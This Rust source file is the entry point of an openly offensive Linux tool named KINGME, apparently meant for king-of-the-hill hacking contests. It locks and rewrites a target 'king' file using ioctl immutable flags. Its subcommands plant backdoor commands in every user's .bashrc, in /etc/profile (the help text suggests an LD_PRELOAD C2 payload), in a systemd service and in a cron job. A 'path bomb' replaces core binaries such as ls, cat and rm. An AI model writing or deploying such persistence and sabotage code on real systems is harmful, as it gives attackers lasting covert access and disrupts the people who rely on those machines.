use std::fs::{File, Permissions, read_to_string, write};
use std::io::Write;
use std::os::fd::AsRawFd;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;
use std::thread;
use std::time::Duration;

use clap::{Parser, Subcommand};
use color_print::cprintln;
use nix::unistd::Uid;

use ui::{print_error, print_status};

use crate::ui::print_success;
use crate::cmd::*;
use crate::ioctl::ioctl_file_set_flags;
use crate::error::Result;

pub mod ui;
pub mod error;
pub mod ioctl;
pub mod cmd;

#[derive(Parser, Debug)]
#[clap(author="Ronan Boyarski", version="0.1.0")]
struct Args {
    #[command(subcommand)]
    cmd: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    #[clap(about="Overwrite a given file 10 times per second. Uses ioctl to lock and unlock the file if done with root privileges.")]
    KingMe {
        #[clap(short, long)]
        king_file: String,
        #[clap(short, long)]
        data: String,
    },
    #[clap(about="Unlock a file using ioctl (root)")]
    FileUnlock {
        #[clap(short, long)]
        file: String,
    },
    #[clap(about="Lock a file using ioctl (root)")]
    FileLock {
        #[clap(short, long)]
        file: String,
    },
    #[clap(about="List the attributes of a file using ioctl (root)")]
    LsAttr {
        #[clap(short, long)]
        file: String,
    },
    #[clap(about="Persistence tactics")]
    Persist {
        #[command(subcommand)]
        tactic: PersistenceCommands,
    },
    #[clap(about="Tactics that are... ungentlemanly, to say the least.")]
    Mayhem {
        #[command(subcommand)]
        tactic: MayhemCommands,
    }
}

#[derive(Subcommand, Debug)]
enum PersistenceCommands {
    #[clap(about="Adds the given command to ALL users' .bashrc files. This will run the command every time a user logs in.")]
    Bashrc {
        #[clap(short, long)]
        command: String,
    },
    #[clap(about="Appends to the /etc/profile file. You should probably use this with: LD_PRELOAD=<your-c2-payload>.so")]
    Profile {
        #[clap(short, long)]
        command: String,
    },
    #[clap(about="Adds a service executing the given command and starts it")]
    Service {
        #[clap(short, long)]
        name: String,
        #[clap(short, long)]
        command: String,
    },
    #[clap(about="Adds a cron job executing the given command every minute")]
    Cron {
        #[clap(short, long)]
        name: String,
        #[clap(short, long)]
        command: String,
    },
}

#[derive(Subcommand, Debug)]
enum MayhemCommands {
    #[clap(about="Copies /bin/ls, /bin/cat, /usr/bin/rm, /usr/bin/whoami to a safe path, and replaces the originals with the given command")]
    PathBomb {
        #[clap(short, long)]
        safe_path: String,
        #[clap(short, long)]
        command: Option<String>,
    },
}

unsafe fn king_loop(king_file: String, data: String) -> Result<()> {
    // Create the king.txt if it doesn't exist
    if !Path::new(&king_file).exists() {
        print_status(format!("{king_file} does not exist, creating it now"));
        let f = File::create(king_file.clone())?;
    }

    let file = File::open(&king_file)?;

    // Unlock with IOCTLs
    if Uid::effective().is_root() {
        ioctl_file_set_flags(king_file.clone(), 0)?
    }

    // Update the file to make us king if we are not already
    if read_to_string(&king_file).unwrap_or_default() != data {
        // Update file permissions to 600 (read-write for current user only)
        let perm = Permissions::from_mode(0o600);
        file.set_permissions(perm)?;
        write(&king_file, &data)?;
    }

    // Set permissions to read-only for all users
    let perm = Permissions::from_mode(0o444);
    file.set_permissions(perm)?;

    // Lock it with IOCTL
    if Uid::effective().is_root() {
        ioctl_file_set_flags(king_file.clone(), 16)?;
    }

    Ok(())
}

unsafe fn king_me(king_file: String, data: String) {
    loop {
        match king_loop(king_file.clone(), data.clone()) {
            Ok(_) => {},
            Err(e) => print_error(e),
        }
        thread::sleep(Duration::from_millis(100));
    }
}


fn main() {
    let banner = r#" _       _________ _        _______  _______  _______
| \    /\\__   __/( (    /|(  ____ \(       )(  ____ \
|  \  / /   ) (   |  \  ( || (    \/| () () || (    \/
|  (_/ /    | |   |   \ | || |      | || || || (__
|   _ (     | |   | (\ \) || | ____ | |(_)| ||  __)
|  ( \ \    | |   | | \   || | \_  )| |   | || (
|  /  \ \___) (___| )  \  || (___) || )   ( || (____/\
|_/    \/\_______/|/    )_)(_______)|/     \|(_______/
"#;
    cprintln!("<bold><blue>{}</blue></bold>", banner);

    let args = Args::parse();

    match args.cmd {
        Commands::KingMe { king_file, data } => {
            unsafe {
                king_me(king_file, data);
            }
        }
        Commands::FileUnlock { file } => {
            unsafe {
                file_unlock(file);
            }
        }
        Commands::FileLock { file } => {
            unsafe {
                file_lock(file);
            }
        }
        Commands::LsAttr { file } => {
            unsafe {
                lsattr(file);
            }
        }
        Commands::Persist { tactic } => {
            match tactic {
                PersistenceCommands::Bashrc { command } => {
                    unsafe {
                        bashrc_backdoor(command);
                    }
                }
                PersistenceCommands::Service { name, command } => {
                    service_backdoor(name, command);
                }
                PersistenceCommands::Cron { name, command } => {
                    cron_backdoor(name, command);
                },
                PersistenceCommands::Profile { command } => {
                    profile_backdoor(command);
                }
            }
        }
        Commands::Mayhem { tactic } => {
            match tactic {
                MayhemCommands::PathBomb { safe_path, command } => {
                    path_bomb(safe_path, command);
                }
            }
        }
    }
}
